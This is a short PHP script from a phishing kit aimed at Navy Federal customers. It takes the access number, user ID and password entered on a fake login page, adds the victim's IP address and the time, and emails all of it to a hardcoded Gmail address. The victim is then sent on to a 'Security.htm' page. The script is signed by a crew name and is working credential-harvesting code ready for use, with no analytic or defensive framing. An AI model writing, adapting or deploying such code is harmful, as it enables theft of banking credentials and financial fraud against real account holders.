<?php

session_start();
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$message .= "==================Personal Information==================\n";
$message .= "Access Number:".$_POST['comboLogonNumber']."\n";
$message .= "userid:".$_POST['userid']."\n";
$message .= "password:".$_POST['passwrd']."\n";
$message .= "======================================\n";
$message .= "IP: ".$ip."\n"; 
$message .= "Date: ".$adddate."\n";
$message .= "================Created By ChopMon1 Cr3W===============\n";
$recipient = "gboymoni67@gmail.com";
$subject = "NavyFed: ".$ip."\n"; // change subject if you like
$headers = "From: Navy <docs@consultant.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
	 if (mail($recipient,$subject,$message,$headers))
	   {
		   header("Location: Security.htm");

	   }


?>